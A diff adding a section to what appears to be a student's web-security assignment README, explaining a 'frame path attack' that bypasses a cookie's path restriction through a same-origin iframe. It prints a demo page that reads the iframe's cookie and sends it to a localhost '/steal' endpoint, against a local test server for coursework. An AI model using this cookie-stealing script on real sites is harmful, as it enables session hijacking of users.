@@ -282,6 +282,52 @@ it's x-frame-options not change(see curl_responses file/kompas.com.txt), so I'm 
 
 ## Assignment Description part 2 - Frame Path attack
 
+For the second part of this assignment, I followed much of what was discussed in the week 3 lecture about the path 
+variable being used in a cookie. Paths don't actually offer much security in a cookie, because they can be bypassed
+using the Document Object Model (DOM) by creating an iframe element with the path of said cookie, and then accessing it
+via the contentDocument.cookie property. For this part, I set up two ejs files, one called cookie.ejs, and the other
+frame-path-attack.ejs. The cookie.ejs file creates a cookie that contains a path set to "/cookie", and then sets it.
+
+    <!doctype html>
+    <head>
+        <body>
+            <a href='/'>Back</a>
+            <script type = "text/javascript">
+                document.cookie = "path=/cookie;";
+                document.write(document.cookie)
+            </script>
+        </body>
+    </head>
+
+Next, frame-path-attack.ejs writes a blank document.cookie, creates an iframe of cookie.ejs, and then waits 5000 milliseconds
+before accessing the contentDocument.cookie of the iframe, and if successful, appends the cookie to it. The result will
+be a GET response that then contains the cookie in it, which can be viewed in the case of this demo, through 
+the Web Developer Tools, though you could also set this up to ping a server.
+
+    <!doctype html>
+    <head>
+        <body>
+            <a href='/'>Back</a>
+            <p></p>
+            <script>
+                document.cookie = ''
+                const iframe = document.createElement('iframe')
+                iframe.src = 'http://localhost:4000/cookie'
+                document.body.appendChild(iframe)
+
+
+                setTimeout(function() {
+                    const p = document.createElement('p')
+                    p.innerHTML = iframe.contentDocument.cookie
+                    document.body.appendChild(p)
+
+                    new Image().src = 'http://localhost:4000/steal?cookie=' + iframe.contentDocument.cookie
+                }, 5000);
+
+
+            </script>
+        </body>
+    </head>
 
 
 ## Video Links
@@ -298,3 +344,4 @@ it's x-frame-options not change(see curl_responses file/kompas.com.txt), so I'm 
 
 # References
 
+1.) Cookie Security - https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
